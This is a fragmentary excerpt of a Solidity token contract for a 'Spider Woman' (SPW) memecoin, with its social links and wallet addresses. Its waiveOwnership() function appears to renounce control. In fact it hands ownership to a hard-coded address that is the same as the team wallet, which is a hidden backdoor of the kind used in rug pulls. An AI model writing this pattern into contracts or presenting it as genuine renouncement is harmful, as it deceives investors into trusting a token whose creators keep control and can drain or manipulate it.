...
//https://t.me/Spiderwomeen
//https://twitter.com/spiderwomen00
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xd1759aA46608c47861d99C5583F90c338C6c0641);
    }
...
contract Spiderwoman is Context, IERC20, Ownable {
    ...
    string private _name = "Spider Woman";
    string private _symbol = "SPW";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x5c67014715222550b4Ebb10026329091ce952504);
    address payable private teamWalletAddress = payable(0xd1759aA46608c47861d99C5583F90c338C6c0641);
